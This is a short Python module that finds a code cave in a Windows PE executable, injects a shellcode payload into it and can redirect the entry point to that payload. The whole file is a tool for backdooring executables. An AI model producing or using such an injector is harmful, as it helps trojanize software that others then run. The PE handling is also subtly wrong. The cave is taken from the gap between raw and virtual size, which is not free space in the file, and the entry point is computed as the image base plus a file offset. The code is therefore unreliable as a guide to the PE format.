from pe_analyzer import gather_file_info
import struct
import io

def find_code_cave(binary_path, required_size):
    """Find empty space in PE file suitable for payload injection"""
    pe_info = gather_file_info(binary_path)
    
    with open(binary_path, 'rb') as f:
        # Go to section headers
        section_offset = pe_info['PEOffset'] + 24 + pe_info['SizeOfOptHeader']
        f.seek(section_offset)
        
        for _ in range(pe_info['NumberOfSections']):
            section_name = f.read(8).decode().strip('\x00')
            virtual_size = struct.unpack('<I', f.read(4))[0]
            virtual_address = struct.unpack('<I', f.read(4))[0]
            raw_size = struct.unpack('<I', f.read(4))[0]
            raw_offset = struct.unpack('<I', f.read(4))[0]
            f.seek(16, io.SEEK_CUR)  # Skip rest of section header
            
            # Check if there's space between raw size and virtual size
            if raw_size < virtual_size and (virtual_size - raw_size) >= required_size:
                return {
                    'section': section_name,
                    'offset': raw_offset + raw_size,
                    'size': virtual_size - raw_size
                }
    
    return None

def inject_payload(binary_path, payload, entry_point=None):
    """Inject shellcode payload into PE file"""
    code_cave = find_code_cave(binary_path, len(payload))
    if not code_cave:
        raise Exception("No suitable code cave found")
    
    pe_info = gather_file_info(binary_path)
    
    with open(binary_path, 'r+b') as f:
        # Write payload to code cave
        f.seek(code_cave['offset'])
        f.write(payload)
        
        # If entry_point is specified, modify it
        if entry_point:
            # Calculate new entry point (RVA)
            new_entry_rva = pe_info['ImageBase'] + code_cave['offset']
            
            # Update entry point in optional header
            entry_point_offset = pe_info['PEOffset'] + 24 + 16
            f.seek(entry_point_offset)
            f.write(struct.pack('<I', new_entry_rva))
    
    return {
        'injected_at': code_cave['offset'],
        'original_entry': pe_info['EntryPoint'],
        'new_entry': new_entry_rva if entry_point else None
    }